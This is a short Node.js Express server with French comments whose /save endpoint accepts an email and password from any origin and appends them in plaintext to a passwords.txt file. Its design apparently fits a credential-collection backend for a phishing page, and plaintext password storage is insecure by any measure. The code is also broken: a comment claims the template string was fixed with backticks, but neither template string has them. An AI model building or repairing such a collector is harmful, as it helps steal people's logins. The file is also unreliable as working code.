const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const FILE_PATH = path.join(__dirname, 'passwords.txt');

// Route pour sauvegarder email et mot de passe
app.post('/save', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Email et mot de passe requis');
  }

  // Ligne corrigée avec backticks pour template string
  const line = Email: ${email}, Password: ${password}\n;

  fs.appendFile(FILE_PATH, line, (err) => {
    if (err) {
      console.error('Erreur écriture fichier:', err);
      return res.status(500).send('Impossible d’enregistrer');
    }
    res.send('Données enregistrées !');
  });
});

// Route pour vérifier si le serveur fonctionne
app.get('/', (req, res) => {
  res.send('Server running');
});

app.listen(PORT, () => {
  console.log(Server running on port ${PORT});
});